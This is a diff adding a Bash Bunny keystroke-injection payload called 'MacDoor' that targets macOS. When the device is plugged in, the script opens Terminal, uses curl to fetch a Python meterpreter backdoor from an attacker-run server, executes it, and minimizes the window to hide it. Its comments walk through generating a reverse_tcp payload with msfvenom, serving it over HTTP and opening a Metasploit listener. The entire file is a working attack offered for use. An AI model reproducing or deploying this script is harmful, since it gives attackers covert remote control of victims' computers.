@@ -1,0 +1,47 @@
+#!/bin/bash
+#
+# Title:         MacDoor
+# Description:   Download a Python backdoor from our server, run it in terminal and minimize the terminal window.
+# Author:        afsh4ck
+# Version:       1.0
+# Target:        MacOS
+# Category:      Execution
+#
+# Steps:
+# Step 1: msfvenom -p python/meterpreter/reverse_tcp LHOST={your IP} LPORT=4444 -o backdoor.py  
+# Step 2: mount a local server 'python3 -m http.server'  
+# Step 3: msfconsole multi/handler listener open before the attack.
+#
+# Note:
+# You need to modify the script with your attacker IP and the port or your local server.
+#
+# Purple.............Setup
+# Yellow blink.......Attack Mode ON
+# Green..............Finish
+
+LED SETUP
+ATTACKMODE HID STORAGE ECM_ETHERNET
+LED ATTACK
+
+# Open terminal
+QUACK GUI SPACE
+QUACK DELAY 500
+QUACK STRING Terminal
+QUACK ENTER
+QUACK DELAY 3000
+
+# Execute attack
+QUACK STRING curl http://192.168.1.139:8000/backdoor.py -o Downloads/backdoor.py
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING cd Downloads
+QUACK ENTER
+QUACK STRING python3 backdoor.py
+QUACK ENTER
+
+# Minimize terminal
+QUACK GUI m
+QUACK DELAY 2000
+
+# Standby
+LED FINISH
